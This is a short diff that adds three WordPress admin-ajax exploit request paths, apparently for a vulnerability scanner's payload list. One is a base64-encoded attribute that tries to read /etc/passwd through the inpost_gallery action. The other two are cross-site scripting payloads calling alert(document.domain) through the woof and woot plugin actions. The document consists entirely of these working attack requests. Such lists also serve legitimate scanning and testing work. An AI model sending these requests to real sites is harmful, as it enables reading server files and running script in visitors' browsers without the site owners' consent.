@@ -1,0 +1,3 @@
+/wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=eyJwYWdlcGF0aCI6ICJmaWxlOi8vL2V0Yy9wYXNzd2QifQ==
+/wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=<img%20src=x%20onerror=alert(document.domain)>
+/wp-admin/admin-ajax.php?action=woot_get_smth&what={%22call_action%22:%22x%22,%22more_data%22:%22\u003cscript%3Ealert(document.domain)\u003c/script%3E%22}
